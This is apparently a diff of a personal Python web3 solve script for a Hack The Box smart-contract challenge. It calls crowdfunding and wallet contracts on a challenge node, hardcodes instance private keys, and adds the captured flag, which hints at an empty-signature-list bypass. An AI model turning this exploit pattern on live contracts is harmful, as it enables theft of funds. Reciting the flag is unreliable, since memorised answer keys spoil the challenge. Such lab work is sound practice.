@@ -6,19 +6,19 @@ from eth_account.messages import encode_defunct
 from eth_utils import keccak
 
 '''
-Private key           :  0x976bdedb3d2659f6eeb93eff9b5691e645757af37f997ac7036735eead99ff93
-Address               :  0x7F89D36714adA6e375Da57ce6f6CAcA08CA2a413
-Crowdfunding contract :  0xd2180C553707F73F0b92aa3eE590d28A8bA92574
-Wallet contract       :  0xB1928Ee7b85d9B5F94213eceCA3072CeFC9a2274
-Setup contract        :  0x7970DD749d501385B39c88DA47d0dFFD8A531458
+Private key           :  0x77dd6f7077f73f5fa2441882cf480796a9cd5198b0633b87cb837d47d8f46b06
+Address               :  0x620922Feb2f7D1898728A9Ec9e7945f986f656FB
+Crowdfunding contract :  0xB176D42e9aF0F41913241A12FcEd0eb95456412d
+Wallet contract       :  0xA2E2153E89322ce18fE0DC5C1ba586e88dC95AD3
+Setup contract        :  0xD8C1cBb8c270C804a17a52c67F3d1C8de00E73F9
 '''
 
 x = {
-    "PrivateKey":    "0x976bdedb3d2659f6eeb93eff9b5691e645757af37f997ac7036735eead99ff93",
-    "Address":       "0x7F89D36714adA6e375Da57ce6f6CAcA08CA2a413",
-    "TargetAddress": "0xd2180C553707F73F0b92aa3eE590d28A8bA92574",
-    "WalletAddress": "0xB1928Ee7b85d9B5F94213eceCA3072CeFC9a2274",
-    "setupAddress":  "0x7970DD749d501385B39c88DA47d0dFFD8A531458"
+    "PrivateKey":    "0x77dd6f7077f73f5fa2441882cf480796a9cd5198b0633b87cb837d47d8f46b06",
+    "Address":       "0x620922Feb2f7D1898728A9Ec9e7945f986f656FB",
+    "TargetAddress": "0xB176D42e9aF0F41913241A12FcEd0eb95456412d",
+    "WalletAddress": "0xA2E2153E89322ce18fE0DC5C1ba586e88dC95AD3",
+    "setupAddress":  "0xD8C1cBb8c270C804a17a52c67F3d1C8de00E73F9"
 }
 
 PrivateKey =    x["PrivateKey"]
@@ -29,9 +29,8 @@ WalletContract = x["WalletAddress"]
 
 #Attack Contract address
 #Target2Contract = "0x5D18A6F24D615134a6b6b4c95cE08347c804dF67"
-Target2Contract = "0x39D81447e4E493A543c5F58604F45C4642f39590"
 
-url = 'http://157.245.37.125:31711'
+url = 'http://157.245.37.125:31182'
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -42,12 +41,6 @@ balance = w3.eth.get_balance(account_address)
 print(balance)
 block = w3.eth.get_block(block_number)
 
-all_accounts = w3.eth.accounts
-
-print("All accounts in the network:")
-for account in all_accounts:
-        print(account)
-
 account_from = {
         'private_key': PrivateKey,
         'address': account_address,
@@ -55,19 +48,8 @@ account_from = {
 
 install_solc("0.8.18")
 signatures = []
-addresses = ["0x0000000000000000000000000000000000000001","0x0000000000000000000000000000000000000002","0x0000000000000000000000000000000000000003","0x0000000000000000000000000000000000000004","0x0000000000000000000000000000000000000005","0x0000000000000000000000000000000000000006","0x0000000000000000000000000000000000000007","0x0000000000000000000000000000000000000008","0x0000000000000000000000000000000000000009"]
 
-#private_key = "0x3fa8b14e683907bfefdebe44f91d81225197136f59cba6e8bf5a8e3b9fa40569"
-private_key = PrivateKey
-private_key = "0x976bdedb3d2659f6eeb93eff9b5691e645757af37f997ac7036735eead99ff93"
-
-for address in addresses:
-	message_hash = w3.keccak(text=Address)
-	message = encode_defunct(hexstr=w3.to_hex(message_hash))
-	signature = w3.eth.account.sign_message(message, private_key=private_key).signature
-	signatures.append(signature)
-print(signatures)
-
+'''
 compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.8.18")
 abi = compiled['Contract.sol:Contract']['abi']
 contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
@@ -75,9 +57,8 @@ contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
 #print(number)
 number = contract_instance2.functions.closeCampaign(signatures, Address).call()
 print(number)
+'''
 
-
-exit(0)
 compiled = compile_files(["Campaign.sol"], output_values=["abi"], solc_version="0.8.18")
 abi = compiled['Campaign.sol:CouncilWallet']['abi']
 contract_instance2 = w3.eth.contract(address=WalletContract, abi=abi)
@@ -109,7 +90,7 @@ contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
 number = contract_instance.functions.isSolved().call()
 
 print(f'The current number stored is: { number } ')
-#
+#HTB{wh0_c0u1d_7h1nk_7h47_y0u_c4n_53nd_4n_3mp7y_1157}
 
 
 '''
